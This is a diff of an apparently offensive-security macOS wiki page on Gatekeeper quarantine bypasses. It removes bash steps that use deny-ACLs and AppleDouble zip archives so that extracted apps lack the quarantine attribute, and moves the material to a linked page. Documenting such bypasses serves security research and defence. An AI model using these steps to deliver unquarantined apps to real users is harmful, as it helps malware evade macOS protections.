@@ -142,67 +142,9 @@ ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
 
 If the volume is later read on a path that ignores the `._` companion (or the companion is stripped/deleted), the file arrives **without a quarantine flag** — and an unquarantined `.app` is enough to escape the App Sandbox, as covered in [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).
 
-### writeextattr ACL
+### writeextattr ACL and AppleDouble quarantine behavior
 
-This ACL prevents from adding `xattrs` to the file
-
-```bash
-rm -rf /tmp/test*
-echo test >/tmp/test
-chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
-ls -le /tmp/test
-ditto -c -k test test.zip
-# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
-
-cd /tmp
-echo y | rm test
-
-# Decompress it with ditto
-ditto -x -k --rsrc test.zip .
-ls -le /tmp/test
-
-# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
-open test.zip
-sleep 1
-ls -le /tmp/test
-```
-
-### **com.apple.acl.text xattr + AppleDouble**
-
-**AppleDouble** file format copies a file including its ACEs.
-
-In the [**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) it's possible to see that the ACL text representation stored inside the xattr called **`com.apple.acl.text`** is going to be set as ACL in the decompressed file. So, if you compressed an application into a zip file with **AppleDouble** file format with an ACL that prevents other xattrs to be written to it... the quarantine xattr wasn't set into de application:
-
-Check the [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) for more information.<sup>[[6]](#references)</sup>
-
-To replicate this we first need to get the correct acl string:
-
-```bash
-# Everything will be happening here
-mkdir /tmp/temp_xattrs
-cd /tmp/temp_xattrs
-
-# Create a folder and a file with the acls and xattr
-mkdir del
-mkdir del/test_fold
-echo test > del/test_fold/test_file
-chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
-chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
-ditto -c -k del test.zip
-
-# uncomporess to get it back
-ditto -x -k --rsrc test.zip .
-ls -le test
-```
-
-(Note that even if this works the sandbox write the quarantine xattr before)
-
-Not really needed but I leave it there just in case:
-
-
-{{#ref}}
-macos-xattr-acls-extra-stuff.md
-{{#endref}}
+For the `writeextattr` ACL example, the `com.apple.acl.text` AppleDouble mechanism, and the sidecar construction and validation steps, see [AppleDouble/ACL quarantine bypass reproduction](macos-appledouble-acl-quarantine-bypass.md).
 
 ## Bypass signature checks
 
@@ -516,7 +458,6 @@ This feature is particularly useful for preventing certain classes of security v
 - [3] [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
 - [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
 - [5] [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
-- [6] [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
 - [7] [Mickey (Jhftss) - A New Era of macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
 - [8] [Kandji - Uncovering Apple Vulnerabilities: The diskarbitrationd and storagekitd Audit Story Part 1](https://www.kandji.io/blog/macos-audit-story-part1)
 
